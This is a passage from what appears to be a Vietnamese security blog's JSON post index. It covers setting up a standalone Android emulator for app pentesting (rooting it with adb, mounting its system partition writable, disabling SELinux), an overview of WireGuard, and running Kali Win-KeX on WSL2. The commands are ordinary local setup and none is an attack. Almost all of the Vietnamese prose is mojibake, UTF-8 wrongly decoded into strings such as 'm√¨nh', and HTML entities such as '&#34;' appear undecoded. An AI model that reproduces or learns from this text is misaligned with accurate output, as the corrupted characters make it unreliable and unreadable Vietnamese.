v√¨ m√¨nh ƒë·ª° b·ªè qua c√°c l·ªói c∆° b·∫£n kh√¥ng ƒë√°ng c√≥, nh·∫•t l√† v·ªõi l∆∞·ª£ng sub-domain kh√° l·ªõn, hay scope r·ªông c·ªßa c√°c program.\nTrong kho·∫£ng th·ªùi gian t√¨m ki·∫øm tools t·ª± ƒë·ªông c√≥ th·ªÉ ƒë∆°n gi·∫£n ho√° vi·ªác recon website th√¨ ng∆∞·ªùi anh ng·ªìi c·∫°nh m√¨nh suggest cho m√¨nh m·ªôt tool kh√° hay.","title":"H√£y ƒë·ªÉ vi·ªác fuzzing ƒë∆°n gi·∫£n h∆°n v·ªõi Nuclei"},{"content":"T·ª± s·ª± m·ªôt ch√∫t Cu·ªëi tu·∫ßn h∆°i r·∫£nh l·∫°i s·∫Øp r·ªß b·∫°n g√°i ƒëi ƒÉn, n√™n m√¨nh c√≥ download 1 app android c·ªßa 1 chu·ªói c·ª≠a h√†ng c√≥ ti·∫øng ·ªü H√† N·ªôi v·ªÅ ƒë·ªÉ xem c√≥ khuy·∫øn m·∫°i g√¨ kh√¥ng. V·ªõi m·ªôt pentester th√¨ khi m√¨nh d√πng c√°i app n√†y m√¨nh ƒë√£ ng·ª≠i th·∫•y m√πi sai sai g√¨ r·ªìi. Kh·ªï n·ªói 1 ƒëi·ªÅu l√† m√¥i tr∆∞·ªùng l·∫°i config h·∫øt tr√™n m√°y c√¥ng ty r·ªìi, m√°y ·ªü nh√† m√¨nh tr∆∞·ªõc c√≥ c√†i m√† g·ª° ƒëi m·∫•t r·ªìi. Ch·∫≥ng l·∫Ω l·∫°i l√™n c√¥ng ty ng·ªìi test :triumph:.\nV·ªõi b·∫£n t√≠nh h∆°i l∆∞·ªùi c·ªßa m√¨nh th√¨ ch·∫Øc ch·∫Øn m√¨nh s·∫Ω kh√¥ng l√™n c√¥ng ty m√† setup m√¥i tr∆∞·ªùng ·ªü nh√† lu√¥n ƒë·ªÉ test cho ti·ªán, sau n√†y c√≤n ph·∫£i test c√°i kh√°c n·ªØa ch·ª© :laughing:\nNg·ªìi nguy√™n c·∫£ m·ªôt bu·ªïi s√°ng th√¨ sau khi c√†i ƒë·ªß th·ªÉ lo·∫°i nh∆∞ genymotion, nox, bluestack, koplayer ƒë·ªÅu kh√¥ng h·ªó tr·ª£ Hyper-V, to√†n y√™u c·∫ßu m√¨nh t·∫Øt Hyper-V ƒëi, trong khi Hyper-V x·ªãn nh∆∞ th·∫ø, ngon nh∆∞ th·∫ø m√† n√≥ kh√¥ng support.\nKh√¥ng ƒë·∫ßu h√†ng tr∆∞·ªõc s·ªë ph·∫≠n, m√¨nh ƒë√£ t√¨m c√°c emulator kh√°c support Hyper-V. Sau m·ªôt h·ªìi t√¨m ki·∫øm th√¨ th·∫•y BlueStack c√≥ support Hyper-V nh∆∞ng ƒëang ·ªü b·∫£n beta, m√¨nh c√†i ƒë·∫∑t 1 h·ªìi m√† n√≥ n·∫∑ng qu√° ch·∫≥ng l√™n n√™n cho n√≥ ra ƒëi t√¨m ƒë∆∞·ªùng c·ª©u n∆∞·ªõc lu√¥n.\nTi·∫øp t·ª•c kh√¥ng b·ªè cu·ªôc, m√¨nh ƒë√£ t√¨m th·∫•y ch√¢n √°i c·ªßa cu·ªôc ƒë·ªùi m√¨nh n·∫±m ·ªü ƒë√¢y Hyper-V Android emulator support  :kissing_closed_eyes:\nTuy nhi√™n, c√†i ƒë·∫∑t Emulator Android th√¨ c·∫ßn ph·∫£i c√†i c·∫£ Android Studio, m√† ·ªï c·ª©ng c·ªßa m√¨nh c√≥ h·∫°n n√™n m√¨nh ƒë√£ t√¨m c√°ch c√†i ƒë·∫∑t m·ªói Emulator th√¥i m√† kh√¥ng c·∫ßn c√†i Android Studio.\nCh√†o m·ª´ng anh em ƒë·∫øn ph·∫ßn ti·∫øp theo :heart_eyes:\nC√†i ƒë·∫∑t Emulator kh√¥ng c·∫ßn c√†i Android Studio Sau ƒë√¢y l√† step-by-step ƒë·ªÉ cho c√°c b·∫°n c√≥ th·ªÉ c√†i ƒë∆∞·ª£c Android Emulator m√† kh√¥ng c·∫ßn c√†i Android Studio :hugs:\n  Download v√† c√†i ƒë·∫∑t JDK, c√°c b·∫°n c√≥ th·ªÉ c√†i JDK b·∫£n n√†o c≈©ng ƒë∆∞·ª£c, t·ª´ 1.8 ƒë·∫øn b·∫£n 15 m·ªõi nh·∫•t hi·ªán nay lu√¥n\n  C√†i bi·∫øn m√¥i tr∆∞·ªùng JAVA_HOME\nM·ªü Command Prompt (Win + R, g√µ cmd v√† nh·∫•n Enter ho·∫∑c b·∫•t k√¨ c√°ch n√†o m√† b·∫°n c√≥ th·ªÉ m·ªü cmd.exe :laughing:)\n1  setx JAVA_HOME \u0026#34;C:\\Program Files\\Java\\jdk-15.0.1\u0026#34;   Ho·∫∑c c√≥ th·ªÉ s·ª≠ d·ª•ng GUI (Start -\u0026gt; Edit the system environment variables -\u0026gt; Environment variables\u0026hellip; -\u0026gt; New\u0026hellip;)\n  ·ªû ƒë√¢y m√¨nh ƒëang c√†i Android Emulator cho Hyper-V n√™n c√°c b·∫°n c·∫ßn ph·∫£i b·∫≠t Hyper-V tr√™n m√°y m√¨nh l√™n nh√© ;)\n  Download Command line tools b·∫£n cho Windows\n  T·∫°o m·ªôt th∆∞ m·ª•c Android ·ªü m·ªôt n∆°i m√† c√°c b·∫°n th√≠ch (·ªû ƒë√¢y m√¨nh cho v√†o ·ªï E cho r·ªông r√£i)\nGi·∫£i n√©n file v·ª´a t·∫£i v√†o th∆∞ m·ª•c v·ª´a t·∫°o T·∫°i ƒë√¢y c·∫ßn ch√∫ √Ω m·ªôt ch√∫t, ·ªü ƒë√¢y c√°c b·∫°n c·∫ßn ph·∫£i s·ª≠ d·ª•ng b√≠ thu·∫≠t n√†y (v√¨ c√°i l·ªói n√†y m√† m√¨nh loay hoay h·∫øt g·∫ßn bu·ªïi s√°ng)\nMove to√†n b·ªô file trong th∆∞ m·ª•c cmdline-tools sang th∆∞ m·ª•c latest n·∫±m trong th∆∞ m·ª•c cmdline-tools\n  Ch√∫ng ta s·∫Ω ƒë∆∞·ª£c m·ªôt c√¢y th∆∞ m·ª•c nh∆∞ sau\n1 2 3 4 5 6  cmdline-tools ‚îî‚îÄ‚îÄ latest ‚îú‚îÄ‚îÄ bin ‚îú‚îÄ‚îÄ lib ‚îú‚îÄ‚îÄ NOTICE.txt ‚îî‚îÄ‚îÄ source.properties     C√†i ƒë·∫∑t bi·∫øn m√¥i tr∆∞·ªùng ANDROID_HOME th√†nh:\n1  setx ANDROID_HOME E:\\Android     T·∫°o new entry cho Path trong bi·∫øn m√¥i tr∆∞·ªùng:\n1  setx path \u0026#34;%PATH%;%ANDROID_HOME%\\cmdline-tools\\latest\\bin\u0026#34; /m   Ho·∫∑c c√≥ th·ªÉ s·ª≠ d·ª•ng GUI n·∫øu c√°c b·∫°n th√≠ch.\n   L∆∞u √Ω: c·∫ßn ph·∫£i t·∫Øt CMD ƒëi r·ªìi b·∫≠t l·∫°i ƒë·ªÉ √°p d·ª•ng c√°c thay ƒë·ªïi.\n  Ki·ªÉm tra sdkmanager ƒë√£ ho·∫°t ƒë·ªông ch∆∞a b·∫±ng c√°ch g√µ l·ªánh\n1  sdkmanager --list   T·∫°i ƒë√¢y c√≥ th·ªÉ xem danh s√°ch c√≥ s·∫µn c·ªßa nh·ªØng g√≥i m√† m√¨nh c√≥ th·ªÉ t·∫£i v·ªÅ. N·∫øu b·ªã l·ªói ·ªü b∆∞·ªõc n√†y th√¨ ki·ªÉm tra c√†i ƒë·∫∑t bi·∫øn m√¥i tr∆∞·ªùng ho·∫∑c c√≥ th·ªÉ post v√†o b√†i n√†y c·ªßa m√¨nh ƒë·ªÉ m√¨nh ki·ªÉm tra gi√∫p ;)\n  Ti·∫øp theo c·∫ßn c√†i ƒë·∫∑t c√°c g√≥i nh∆∞ platform-tools, platform; android-*, emulator v√† system-images; android-*; google_apis; x86_64, trong ƒë√≥ * c√≥ nghƒ©a l√† phi√™n b·∫£n\n1  sdkmanager \u0026#34;platforms;android-25\u0026#34; \u0026#34;system-images;android-25;google_apis;x86_64\u0026#34; \u0026#34;platform-tools\u0026#34; \u0026#34;emulator\u0026#34;     Ti·∫øp theo ch√∫ng ta c·∫ßn ch·∫•p nh·∫≠n c√°c ƒëi·ªÅu kho·∫£n, gi·∫•y ph√©p.\n1  sdkmanager --licenses   ·∫§n Y li√™n t·ªçt l√† ƒë∆∞·ª£c nh√© c√°c b·∫°n ;)\n  Xong b∆∞·ªõc tr√™n l√† ch√∫ng ta c√≥ th·ªÉ t·∫°o ƒë∆∞·ª£c m·ªôt con android ·∫£o m·ªõi r·ªìi ;)\n1  avdmanager create avd -n google-api-25 -k \u0026#34;system-images;android-25;google_apis;x86_64\u0026#34;     ƒê·ªÉ xem danh s√°ch thi·∫øt b·ªã, g√µ l·ªánh:\n1  avdmanager list avd     ƒêi t·ªõi th∆∞ m·ª•c emulator n·∫±m ·ªü Android/emulator r·ªìi g√µ l·ªánh ƒë·ªÉ kh·ªüi ƒë·ªông m√°y ·∫£o:\n1  emulator -avd google-api-25     M·ªôt chi·∫øc m√°y Android c·ª±c x·ªãn d√†nh cho b·∫°n ƒë√£ kh·ªüi ƒë·ªông l√™n ƒë∆∞·ª£c r·ªìi ;)\nL∆∞u √Ω C√°c b·∫°n ho√†n to√†n c√≥ th·ªÉ s·ª≠ d·ª•ng c√°ch n√†y ƒë·ªÉ c√†i Android Emulator l√™n Linux ho·∫∑c MacOS. Mi·ªÖn l√† c√°c b·∫°n hi·ªÉu c·∫•u tr√∫c b√™n Linux v·ªõi MacOS t∆∞∆°ng ·ª©ng v·ªõi Windows l√† ƒë∆∞·ª£c. Ch·ªß y·∫øu l√† c√†i ƒë·∫∑t bi·∫øn m√¥i tr∆∞·ªùng th√¥i ^^\nM·ªôt s·ªë v·∫•n ƒë·ªÅ B·∫°n s·∫Ω kh√¥ng th·ªÉ s·ª≠ d·ª•ng keyboard v·ªõi m√°y ·∫£o ƒë∆∞·ª£c, c·∫ßn ƒë∆∞·ª£c c·∫•u h√¨nh l·∫°i b·∫±ng c√°ch\n  ƒêi t·ªõi th∆∞ m·ª•c .android trong th∆∞ m·ª•c home c·ªßa b·∫°n, di chuy·ªÉn ti·∫øp v√†o avd/google-api-25.avd t√¨m ƒë·∫øn file config.ini v√† s·ª≠a\n1  hw.keyboard=yes     M·ªôt ƒëi·ªÅu h∆°i o√°i oƒÉm n·ªØa l√† m·ªü adb l√™n m√¨nh l√† root r·ªìi m√† kh√¥ng c√≥ quy·ªÅn ghi v√†o\n1 2 3 4  generic_x86_64:/ # whoami root generic_x86_64:/system # touch abc touch: \u0026#39;abc\u0026#39;: Read-only file system   Kh·ªüi ƒë·ªông emulator v·ªõi quy·ªÅn writable v√† disable selinux\n1  emulator -avd google-api-25 -writable-system -selinux disabled   1 2 3 4 5 6 7 8 9 10 11  ‚ûú google-api-25.avd adb root adbd is already running as root ‚ûú google-api-25.avd adb disable-verity Failed to open /fstab.ranchu Maybe run adb root? ‚ûú google-api-25.avd adb reboot ‚ûú google-api-25.avd adb root restarting adbd as root ‚ûú google-api-25.avd adb remount remount succeeded ‚ûú google-api-25.avd adb shell   L√∫c n√†y b·∫°n c√≥ th·ªÉ tho·∫£i m√°i v·ªõi chi·∫øc m√°y ·∫£o m√¨nh v·ª´a t·∫°o ra r·ªìi :sneezing_face:\n  K·∫øt C·∫£m ∆°n anh @vigov5 ƒë√£ support em trong su·ªët th·ªùi gian th·ª±c hi·ªán c√†i ƒë·∫∑t Emulator :D\nTham kh·∫£o  https://dev.to/koscheyscrag/how-to-install-android-emulator-without-installing-android-studio-3lce https://developer.android.com/studio/#downloads https://developer.android.com/studio/run/emulator https://devblogs.microsoft.com/visualstudio/hyper-v-android-emulator-support/  ","permalink":"https://minhtuanact.ml/posts/pentest-android-cai-dat-android-emulator-sao-cho-ngau/","summary":"T·ª± s·ª± m·ªôt ch√∫t Cu·ªëi tu·∫ßn h∆°i r·∫£nh l·∫°i s·∫Øp r·ªß b·∫°n g√°i ƒëi ƒÉn, n√™n m√¨nh c√≥ download 1 app android c·ªßa 1 chu·ªói c·ª≠a h√†ng c√≥ ti·∫øng ·ªü H√† N·ªôi v·ªÅ ƒë·ªÉ xem c√≥ khuy·∫øn m·∫°i g√¨ kh√¥ng. V·ªõi m·ªôt pentester th√¨ khi m√¨nh d√πng c√°i app n√†y m√¨nh ƒë√£ ng·ª≠i th·∫•y m√πi sai sai g√¨ r·ªìi. Kh·ªï n·ªói 1 ƒëi·ªÅu l√† m√¥i tr∆∞·ªùng l·∫°i config h·∫øt tr√™n m√°y c√¥ng ty r·ªìi, m√°y ·ªü nh√† m√¨nh tr∆∞·ªõc c√≥ c√†i m√† g·ª° ƒëi m·∫•t r·ªìi.","title":"[Pentest Android] C√†i ƒë·∫∑t Android Emulator sao cho ng·∫ßu :-?"},{"content":"Gi·ªõi thi·ªáu N·∫øu b·∫°n ƒë√£ t·ª´ng s·ª≠ d·ª•ng Facebook v√†o nh·ªØng nƒÉm th·ª© 10 c·ªßa th·∫ø k·ª∑ 21, b·∫°n ƒë√£ tr·∫£i qua kho·∫£ng th·ªùi gian kh√≥ khƒÉn c·ªßa nh·ªØng d√¢n ch∆°i Facebook h·ªìi ƒë√≥ - s·ª≠ d·ª•ng VPN, v√¨ nh√† m·∫°ng c·ªßa Vi·ªát Nam ch·∫∑n IP c·ªßa Facebook. V·∫≠y VPN l√† g√¨ m√† n√≥ l·∫°i c√≥ th·ªÉ bypass ƒë∆∞·ª£c rule c·ªßa nh√† m·∫°ng nh∆∞ v·∫≠y nh·ªâ :scream:\nVPN (Virtual Private Network - m·∫°ng ri√™ng ·∫£o) cho ph√©p ng∆∞·ªùi d√πng t·∫°o m·ªôt ƒë∆∞·ªùng h·∫ßm (tunnel) ƒë·ªÉ k·∫øt n·ªëi v·ªõi m·ªôt m·∫°ng kh√°c tr√™n Internet. VPN r·∫•t th√≠ch h·ª£p khi c√°c b·∫°n mu·ªën s·ª≠ d·ª•ng Internet v·ªõi m·ª•c ƒë√≠ch ri√™ng t∆∞, ngƒÉn ch·∫∑n vi·ªác ki·ªÉm tra truy c·∫≠p c·ªßa ISP - nh√† cung c·∫•p d·ªãch v·ª• m·∫°ng, hay l√† b·∫°n truy c·∫≠p Wifi trong qu√°n cafe m√† v·∫´n mu·ªën ri√™ng t∆∞, hay v·ªõi m·ªôt ƒëi·ªÅu kh√°c l√† b·∫°n ng·ªìi t·∫°i c√¥ng ty nh∆∞ng mu·ªën l·∫•y d·ªØ li·ªáu t·ª´ ·ªï c·ª©ng ·ªü nh√† b·∫°n.\nChuy·ªán ·ªü m·ªôt c√¥ng ty n·ªç, v√†o gi·ªù l√†m l√† b·ªã ch·∫∑n Youtube, nh∆∞ng t√†i li·ªáu h·ªçc t·∫≠p to√†n ·ªü tr√™n ƒë√≥ m·ªõi kh·ªï, th·∫ø n√™n m·ªôt ng∆∞·ªùi anh x√£ h·ªôi c·ªßa t√¥i ph·∫£i s·ª≠ d·ª•ng VPN ƒë·ªÉ xem ƒë∆∞·ª£c Yotube.\n \u0026ldquo;Tuy anh ƒëang s·ªëng ·ªü Vi·ªát Nam, nh∆∞ng l√∫c n√†o anh c≈©ng ƒëang ·ªü b√™n M·ªπ\u0026rdquo; - Tr√≠ch l·ªùi m·ªôt ng∆∞·ªùi anh x√£ h·ªôi n√†o ƒë√≥.\n Tuy nhi√™n, b√†i n√†y c·ªßa m√¨nh kh√¥ng ph·∫£i l√† gi·ªõi thi·ªáu VPN l√† g√¨, c√°ch ho·∫°t ƒë·ªông c·ªßa n√≥ ra sao. ·ªû ƒë√¢y, m√¨nh mu·ªën gi·ªõi thi·ªáu v·ªõi c√°c b·∫°n m·ªôt lo·∫°i VPN t·∫ßm g·∫ßn 1 nƒÉm m√¨nh th∆∞·ªùng xuy√™n s·ª≠ d·ª•ng. N√≥ kh√°c ho√†n to√†n v·ªõi OpenVPN, IPSec m√† c√°c b·∫°n t·ª´ng bi·∫øt, ƒë√≥ l√† nh·ªØng ti√™u chu·∫©n VPN t·ª´ r·∫•t l√¢u r·ªìi. H√¥m nay m√¨nh mu·ªën gi·ªõi thi·ªáu v·ªÅ WireGuard - VPN hi·ªán ƒë·∫°i b√¢y gi·ªù.\nWireGuard l√† g√¨? C≈©ng gi·ªëng nh∆∞ OpenVPN v√† IPSec, WireGuard l√† m·ªôt h·ªá th·ªëng VPN, n√≥ c≈©ng gi√∫p c√°c b·∫°n thi·∫øt l·∫≠p m·ªôt k·∫øt n·ªëi m√£ h√≥a gi·ªØa m√°y client v√† server th√¥ng qua k·∫øt n·ªëi Internet. WireGuard ƒë∆∞·ª£c ho·∫°t ƒë·ªông ·ªü layer 3, ƒë∆∞·ª£c thi·∫øt k·∫ø nh∆∞ m·ªôt virtual network interface c·ªßa Kernel cho Linux. WireGuard ƒë∆∞·ª£c sinh ra nh·∫±m m·ª•c ƒë√≠ch thay th·∫ø cho IPSec trong h·∫ßu h·∫øt c√°c tr∆∞·ªùng h·ª£p s·ª≠ d·ª•ng, v√† d·ª±a v√†o c√°c gi·∫£i ph√°p d·ª±a tr√™n TLS nh∆∞ OpenVPN, trong khi WireGuard an to√†n h∆°n, nhanh h∆°n, v√† d·ªÖ s·ª≠ d·ª•ng h∆°n.\nLinus Torvalds ƒë√£ g·ª≠i mail cho David Miller v·ªõi n·ªôi dung nh∆∞ th·∫ø n√†y\n Pulled.\nBtw, on an unrelated issue: I see that Jason actually made the pull request to have wireguard included in the kernel.\nCan I just once again state my love for it and hope it gets merged soon? Maybe the code isn\u0026rsquo;t perfect, but I\u0026rsquo;ve skimmed it, and compared to the horrors that are OpenVPN and IPSec, it\u0026rsquo;s a work of art.\n Linus Torvalds - ng∆∞·ªùi s√°ng t·∫°o ra Linux ƒë√£ n√≥i v·ªÅ WireGuard nh∆∞ m·ªôt t√°c ph·∫©m ngh·ªá thu·∫≠t v·∫≠y. WireGuard c√≥ code OpenSource tr√™n Github v√† n√≥ ch·ªâ c√≥ ch∆∞a ƒë·∫øn 4000 d√≤ng code, kh√¥ng b·∫±ng 1% s·ªë l∆∞·ª£ng code c·ªßa OpenVPN (600.000 d√≤ng), gi√∫p d·ªÖ d√†ng ki·ªÉm tra v√† x√°c minh.\nWireGuard ƒë√£ ƒë∆∞·ª£c t√≠ch h·ª£p v√†o Kernel 5.6 (c√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc t·∫°i https://lists.zx2c4.com/pipermail/wireguard/2020-March/005206.html). V·∫≠y l√† t·ª´ Kernel 5.6 tr·ªü ƒëi, WireGuard ƒë∆∞·ª£c c√†i ƒë·∫∑t theo m·∫∑c ƒë·ªãnh, v√† s·∫Ω gi√∫p cho m·ªçi ng∆∞·ªùi ti·∫øp c·∫≠n v·ªÅ WireGuard nhi·ªÅu h∆°n, t·ªët h∆°n.\nWireGuard nhanh nh∆∞ th·∫ø n√†o? N√£y gi·ªù m√¨nh ƒë√£ n√≥i WireGuard n√≥ nhanh h∆°n OpenVPN hay IPSec, v·∫≠y n√≥ nhanh ƒë·∫øn m·ª©c nh∆∞ th·∫ø n√†o. C√≥ m·ªôt b√†i test kh√°ch quan ·ªü d∆∞·ªõi ƒë√¢y, m·ªçi ng∆∞·ªùi c√≥ th·ªÉ xem v√† so s√°nh nh√© {@embed: https://www.youtube.com/watch?v=RkgL-NfPdYs}\nTrao ƒë·ªïi kh√≥a v√† g√≥i d·ªØ li·ªáu WireGuard s·ª≠ d·ª•ng Noise_IK b·∫Øt tay t·ª´ Noise, d·ª±a tr√™n ho·∫°t ƒë·ªông c·ªßa CurveCP, NaCL, KEA +, SIGMA, FHMQV v√† HOMQV . T·∫•t c·∫£ ƒë∆∞·ª£c ƒë√≥ng g√≥i v√† ƒë∆∞·ª£c g·ª≠i qua UDP.\nTrao ƒë·ªïi kh√≥a c√≥ c√°c ƒë·∫∑c t√≠nh t·ªët sau:\n Tr√°nh m·∫°o danh Tr√°nh c√°c cu·ªôc t·∫•n c√¥ng ph√°t l·∫°i (replay attack) Perfect forward secrecy ƒê·∫°t ƒë∆∞·ª£c \u0026ldquo;AKE Security\u0026rdquo; ·∫®n danh  Nh∆∞·ª£c ƒëi·ªÉm c·ªßa WireGuard  Ch·ªâ h·ªó tr·ª£ giao th·ª©c UDP V·∫´n ƒëang ƒë∆∞·ª£c contribute ƒë·ªÉ ƒë∆∞·ª£c ho√†n thi·ªán h∆°n Ho·∫°t ƒë·ªông t·ªët nh·∫•t tr√™n Linux  Tham kh·∫£o  https://www.wireguard.com/ https://www.wireguard.com/protocol/ https://www.wireguard.com/papers/wireguard.pdf https://www.wireguard.com/repositories/ https://lists.openwall.net/netdev/2018/08/02/124 https://duo.com/decipher/wireguard-vpn-added-to-linux-kernel  ","permalink":"https://minhtuanact.ml/posts/wireguard-mot-tac-pham-nghe-thuat/","summary":"Gi·ªõi thi·ªáu N·∫øu b·∫°n ƒë√£ t·ª´ng s·ª≠ d·ª•ng Facebook v√†o nh·ªØng nƒÉm th·ª© 10 c·ªßa th·∫ø k·ª∑ 21, b·∫°n ƒë√£ tr·∫£i qua kho·∫£ng th·ªùi gian kh√≥ khƒÉn c·ªßa nh·ªØng d√¢n ch∆°i Facebook h·ªìi ƒë√≥ - s·ª≠ d·ª•ng VPN, v√¨ nh√† m·∫°ng c·ªßa Vi·ªát Nam ch·∫∑n IP c·ªßa Facebook. V·∫≠y VPN l√† g√¨ m√† n√≥ l·∫°i c√≥ th·ªÉ bypass ƒë∆∞·ª£c rule c·ªßa nh√† m·∫°ng nh∆∞ v·∫≠y nh·ªâ :scream:\nVPN (Virtual Private Network - m·∫°ng ri√™ng ·∫£o) cho ph√©p ng∆∞·ªùi d√πng t·∫°o m·ªôt ƒë∆∞·ªùng h·∫ßm (tunnel) ƒë·ªÉ k·∫øt n·ªëi v·ªõi m·ªôt m·∫°ng kh√°c tr√™n Internet.","title":"Wireguard, m·ªôt t√°c ph·∫©m ngh·ªá thu·∫≠t"},{"content":"Overview V√†o ng√†y 18-08-2020, Kali Linux release phi√™n b·∫£n 2020.3 v·ªõi nhi·ªÅu c·∫£i ti·∫øn nh∆∞ thay th·∫ø Bash truy·ªÅn th·ªëng sang ZSH,\u0026hellip; nh∆∞ng ƒë·ªëi v·ªõi m√¨nh, ·∫•n t∆∞·ª£ng h∆°n c·∫£ l√† Win-KeX (Windows + Kali Desktop EXperience) ƒë∆∞·ª£c Kali h·ªó tr·ª£ ƒë·ªÉ s·ª≠ d·ª•ng giao di·ªán ƒë·ªì ho·∫° v·ªõi WSL2 tr√™n Windows.\nC√≥ th·ªÉ th·∫•y r·∫±ng vi·ªác b·∫°n s·ª≠ d·ª•ng Windows nh∆∞ng v·∫´n mu·ªën hacking tr√™n Kali Linux m√† kh√¥ng mu·ªën b·∫≠t VMWare l√™n hay Dual-boot th√¨ ƒë√¢y ch√≠nh l√† gi·∫£i ph√°p cho b·∫°n, qu√° tr√¨nh kh·ªüi ƒë·ªông c≈©ng r·∫•t nhanh n·ªØa :D.\nSetting ƒê·∫ßu ti√™n b·∫°n c·∫ßn ch·∫Øc ch·∫Øn r·∫±ng m√°y Windows c·ªßa m√¨nh s·ª≠ d·ª•ng WSL2, t·∫•t c·∫£ qu√° tr√¨nh c√†i ƒë·∫∑t b·∫°n c√≥ th·ªÉ ƒë·ªçc t·∫°i https://docs.microsoft.com/vi-vn/windows/wsl/install-win10#step-2---update-to-wsl-2\nKi·ªÉm tra vi·ªác m√¨nh ƒë√£ s·ª≠ d·ª•ng WSL2 hay ch∆∞a ch√∫ng ta c√≥ c√¢u l·ªánh\n1 2 3  C:\\Users\\minht\u0026gt;wsl --list -v NAME STATE VERSION * kali-linux Running 2   ·ªû ƒë√¢y m√¨nh ƒëang s·ª≠ d·ª•ng kali-linux ·ªü WSL2 r·ªìi.\nTi·∫øp theo kh·ªüi ƒë·ªông kali-linux l√™n v√† c√†i ƒë·∫∑t win-kex v·ªõi c√¢u l·ªánh sau:\n1  sudo apt update \u0026amp;\u0026amp; sudo apt install -y kali-win-kex   Qu√° tr√¨nh c√†i ƒë·∫∑t di·ªÖn ra c≈©ng h∆°i l√¢u, c≈©ng kho·∫£ng 15-20 ph√∫t tu·ª≥ thu·ªôc v√†o m·∫°ng, s·ª©c m·∫°nh PC c·ªßa b·∫°n v√† m·ªôt tr√°i tim ch·ª©a ƒë·∫ßy s·ª± ch·ªù ƒë·ª£i n·ªØa ^^!\nRun Win-Kex Sau khi c√†i ƒë·∫∑t xong, c√°c b·∫°n c√≥ th·ªÉ g√µ kex v√†o terminal c·ªßa kali l√† ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng giao di·ªán c·ªßa Kali Linux r·ªìi.\nM·∫∑c ƒë·ªãnh n√≥ ·ªü ch·∫ø ƒë·ªô fullscreen n√™n c√°c b·∫°n s·∫Ω h∆°i l√∫ng t√∫ng trong vi·ªác m√¨nh mu·ªën quay tr·ªü v·ªÅ giao di·ªán Windows nh∆∞ th·∫ø n√†o. Tuy nhi√™n ch√∫ng ta c√≥ th·ªÉ ·∫•n n√∫t F8 ƒë·ªÉ hi·ªán th·ªã menu c·ªßa tightvnc ƒë·ªÉ c√≥ th·ªÉ tho√°t kh·ªèi ch·∫ø ƒë·ªô fullscreen n√†y ho·∫∑c l√† s·ª≠ d·ª•ng tu·ª≥ ch·ªçn kh√°c hay ho h∆°n\nWin-Kex 2.0 Tuy nhi√™n, v·ªõi b·∫£n Win-Kex khi m·ªõi release th√¨ v·∫´n c√≤n nhi·ªÅu h·∫°n ch·∫ø, nh∆∞ ch∆∞a h·ªó tr·ª£ √¢m thanh, giao di·ªán th√¨ v·∫´n gi·ªëng nh∆∞ l√† ch·∫°y Windows + VMWare ƒë·ªÉ s·ª≠ d·ª•ng Kali v·∫≠y. Nh∆∞ng v√†o ng√†y 18-09-2020, t·ª©c ƒë√∫ng 1 th√°ng, b·∫£n Win-Kex 2.0 ra ƒë·ªùi v·ªõi nhi·ªÅu c·∫£i ti·∫øn h∆°n c·∫£\n Win-KeX SL (Seamless Edition) H·ªó tr·ª£ √¢m thanh H·ªó tr·ª£ nhi·ªÅu session KeX session c√≥ th·ªÉ ch·∫°y d∆∞·ªõi quy·ªÅn root Chia s·∫ª clipboard: C√≥ th·ªÉ copy paste tho·∫£i m√°i n·ªôi dung gi·ªØa Kali v√† Windows \u0026hellip;.  T·ª´ b·∫£n Win-Kex 2.0 h·ªó tr·ª£ ch·∫ø ƒë·ªô SL (Seamless Edition), ch·∫ø ƒë·ªô xo√° nho√† ranh gi·ªõi gi·ªØa Windows v·ªõi Kali ƒëi, b·∫°n c√≥ bao gi·ªù t∆∞·ªüng t∆∞·ª£ng ƒë∆∞·ª£c vi·ªác m·ªü nh·ªØng ·ª©ng d·ª•ng c·ªßa Kali tr√™n m√†n h√¨nh Windows theo d·∫°ng c·ª≠a s·ªï nh∆∞ h√¨nh d∆∞·ªõi ch∆∞a :D.\nKh·ªüi ƒë·ªông ch·∫ø ƒë·ªô n√†y ch√∫ng ta k√®m theo flag --sl v√† k√®m theo h·ªó tr·ª£ √¢m thanh n·ªØa th√¨ ch√∫ng ta c√≥ flag --s\n1  kex --sl --s   L√∫c n√†y n√≥ hi·ªÉn th·ªã l√™n tr√™n Windows 1 thanh status bar c·ªßa Kali l√™n ƒë·∫ßu nh∆∞ h√¨nh, n√≥ che m·∫•t 1 ph·∫ßn ·ª©ng d·ª•ng tr√™n Windows, hy v·ªçng phi√™n b·∫£n l·∫ßn sau s·∫Ω c√≥ tu·ª≥ ch·ªçn auto hide nh∆∞ thanh start c·ªßa Windows ƒë·ªÉ ƒë·ª° b·ªã chi·∫øm di·ªán t√≠ch\nNh∆∞ h√¨nh n√†y, m√¨nh m·ªü tr√¨nh duy·ªát l√™n th√¨ k nh√¨n th·∫•y c√°i tab n√†o h·∫øt, k s·ª≠ d·ª•ng chu·ªôt ƒë·ªÉ chuy·ªÉn tab ƒë∆∞·ª£c m√† ph·∫£i d√πng ph√≠m t·∫Øt tr√™n keyboard.\nError Trong qu√° tr√¨nh s·ª≠ d·ª•ng, m√¨nh b·ªã c√°i l·ªói k th·ªÉ connect ƒë·∫øn socket c·ªßa kali ƒë∆∞·ª£c, m·∫•t v√†i h√¥m k th·ªÉ m·ªü Kex l√™n ƒë∆∞·ª£c, sau 1 h√¥m l√™n m·∫°ng t√¨m l·ªói th√¨ g·∫∑p b√†i n√†y https://unix.stackexchange.com/questions/605309/not-able-to-initialize-gui-for-kali-linux-in-wsl-2 N·∫øu b·∫°n n√†o b·ªã l·ªói n√†y th√¨ c√≥ th·ªÉ s·ª≠ d·ª•ng 1 trong nh·ªØng c√¢u l·ªánh sau\n1 2 3  kex kill kex --kill kex --stop   R·ªìi sau ƒë√≥ kh·ªüi ƒë·ªông l·∫°i Win-Kex l√† ƒë∆∞·ª£c r·ªìi :)\n C√≥ m·ªôt v√†i c√°ch t·∫°o shortcut cho Windows Terminal ƒë·ªÉ kh·ªüi ƒë·ªông Win-Kex nhanh h∆°n c√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc th√™m t·∫°i\nhttps://www.kali.org/docs/wsl/win-kex/#optional-steps\n Reference  https://www.kali.org/docs/wsl/win-kex/#run-win-kex https://www.kali.org/news/win-kex-version-2-0/ https://www.kali.org/news/kali-2020-3-release/ https://unix.stackexchange.com/questions/605309/not-able-to-initialize-gui-for-kali-linux-in-wsl-2 https://docs.microsoft.com/vi-vn/windows/wsl/install-win10  ","permalink":"https://minhtuanact.ml/posts/win-kex-keo-windows-va-kali-hoa-lam-mot/","summary":"Overview V√†o 